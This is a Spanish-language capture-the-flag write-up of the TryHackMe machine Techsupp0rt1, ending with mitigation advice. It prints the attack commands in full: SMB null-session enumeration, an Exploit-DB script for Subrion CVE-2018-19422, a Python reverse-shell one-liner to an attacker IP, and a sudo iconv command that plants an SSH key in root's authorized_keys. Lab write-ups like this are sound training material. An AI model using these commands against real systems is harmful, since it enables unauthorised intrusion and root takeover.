---
layout: page
title: "Write-up: Techsupp0rt1"
platform: "TryHackMe"
difficulty: "Medium"
category: "Boot2Root"
---

**Write-up**: Techsupp0rt1 - TryHackMe  
**Fecha**: 03/04/2026  
**Autor**: Adrian Sanchez Torrejon  
**Dificultad**: Media  
**IP de la Máquina**: 10.128.172.193

---

# 1. Resumen Ejecutivo

La máquina Techsupport1 es de dificultad fácil y cuenta con un sistema operativo Linux (Ubuntu). El acceso inicial se obtuvo enumerando un recurso compartido de red por SMB donde se hallaron credenciales. Estas credenciales permitieron el acceso a un CMS Subrion vulnerable, el cual fue explotado mediante un bypass de subida de archivos (CVE-2018-19422) para obtener ejecución remota de comandos (RCE). Tras pivotar de usuario usando credenciales encontradas en un archivo de configuración web, la escalada de privilegios se logró aprovechando permisos de Sudo sobre el binario `iconv` para sobreescribir las llaves autorizadas de Root.

- **Acceso a Usuario**: Conseguido
- **Acceso a Root**: Conseguido

# 2. Reconocimiento y Enumeración

## 2.1 Escaneo de Puertos (Nmap)

Se realiza un escaneo inicial para identificar los puertos abiertos y los servicios en ejecución.

```bash
nmap -sV -O -Pn 10.128.172.193
```

**Resultados:** 

![image.png](/assets/images/Techsupp0rt1/image.png)

## 2.2 Escaneo Web

Se ejecutó un escaneo de directorios con Gobuster para buscar rutas ocultas en el servidor web.

- **Herramienta usada:** gobuster

`gobuster dir -u http://10.128.172.193 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`

- **Hallazgos:**

![image.png](/assets/images/Techsupp0rt1/image%201.png)

## 2.3 Escaneo Smb

Haciendo uso de `smbmap` descubrí que era posible listar el sistema de archivos del servidor sin credenciales (Null Session).

- Comando: `smbmap -H '10.129.187.247' -u '' -p ''`

![image.png](/assets/images/Techsupp0rt1/image%202.png)

- Comando `smbmap -H 10.129.140.92 -u '' -p '' -r 'websvr'`

![image.png](/assets/images/Techsupp0rt1/image%203.png)

# 3. Explotación (Acceso Inicial)

## 3.1 Identificación de la Vulnerabilidad

Al descargar y leer el archivo `enter.txt` que se encontraba en el recurso, localicé un listado de tareas pendientes y credenciales:

- Comando: `smbmap -H 10.129.140.92 -u '' -p '' -r 'websvr' -A 'enter.txt'`

![image.png](/assets/images/Techsupp0rt1/image%204.png)

La contraseña fue decodificada a partir de la pista que indicaba una fórmula mágica en el archivo, resultando ser `Scam2021`).

Credenciales: `admin:Scam2021`

![image.png](/assets/images/Techsupp0rt1/image%205.png)

## 3.2 Ejecución y Shell

1. Probe las credenciales en la pagina de Subrion.

![image.png](/assets/images/Techsupp0rt1/image%206.png)

1. Al revisar la versión del software (Subrion CMS 4.2.1), determiné que era vulnerable a un bypass de subida de archivos que conduce a RCE (CVE-2018-19422).

![image.png](/assets/images/Techsupp0rt1/image%207.png)

1. Utilicé un exploit público escrito en Python para automatizar el ataque y obtener una webshell.

Archivo: [https://www.exploit-db.com/exploits/49876](https://www.exploit-db.com/exploits/49876)

Comando: 

```bash
python3 49876.py -u http://10.129.140.92/subrion/panel/ --user=admin --passw=Scam2021
```

![image.png](/assets/images/Techsupp0rt1/image%208.png)

1. 
El script se autenticó, burló las restricciones y subió exitosamente una webshell en formato `.phar`. Tras esto, ejecuté un comando de reversión en Python para mandarme una reverse shell interactiva hacia mi máquina de atacante en el puerto `4002`.

Comando:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.146.227",4002));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
nc -lvnp 4002
```

![image.png](/assets/images/Techsupp0rt1/image%209.png)

Obtuve el acceso como el usuario de servicios web: `www-data`.

## 3.3 Pivoteo de Usuario

1. Comprobe la existencia de usuarios buscando en la carpeta de `/home`

![image.png](/assets/images/Techsupp0rt1/image%2010.png)

1. Buscando en el sistema, accedí a la ruta de la instalación de WordPress y leí el archivo de configuración:

```bash
cat /var/www/html/wordpress/wp-config.php
```

Dentro hallé la contraseña de la base de datos: `ImAScammerLOL!123!`.

![image.png](/assets/images/Techsupp0rt1/image%2011.png)

1. Dado que existía el usuario local `scamsite` en el sistema, probé a autenticarme mediante SSH usando esa contraseña y funcionó exitosamente.

Credenciales: `scamsite:ImAScammerLOL!123!`

![image.png](/assets/images/Techsupp0rt1/image%2012.png)

# 4. Escalada de Privilegios (System / Root)

## 4.1 Enumeración Interna

Como el usuario `scamsite`, procedí a revisar mis permisos de sudo para buscar vías de elevación de privilegios. El resultado mostró que el usuario podía ejecutar /usr/bin/iconv como root sin contraseña.

## 4.2 Explotación y Acceso SYSTEM

De acuerdo con las técnicas de **GTFOBins**, el binario `iconv` se puede usar para escribir datos en archivos con permisos restringidos usando el parámetro `-o` (output).

1. Generé un par de llaves SSH en mi máquina local (Atacante):

```bash
ssh-keygen
```

![image.png](/assets/images/Techsupp0rt1/image%2013.png)

1. Copié mi clave pública y la inyecté directamente en el archivo de llaves autorizadas del usuario root en la máquina víctima usando `iconv`  y me conecte mediante ssh:

```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXkDNR3DpH/7rPbapsdTwl1C3rL7CWXK96+5J+ShwT9 xlmega@kali' | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
```

![image.png](/assets/images/Techsupp0rt1/image%2014.png)

¡Acceso como **Root** concedido!

# 5. Recomendaciones de Mitigación

Para evitar que un atacante replique este vector de ataque, se sugieren las siguientes mitigaciones:

1. **Seguridad en Recursos Compartidos:** Deshabilitar el acceso anónimo (Null Session) a los recursos compartidos de Samba y nunca almacenar credenciales en texto claro dentro de los archivos del servidor.
2. **Actualización de Aplicaciones Web:** Actualizar el CMS Subrion a una versión que solvente el fallo de bypass de subida de archivos (CVE-2018-19422).
3. **Principio de Menor Privilegio (Sudoers):** Restringir el uso de binarios con capacidades de escritura/lectura arbitraria de archivos (como `iconv`) en el archivo de configuración Sudoers.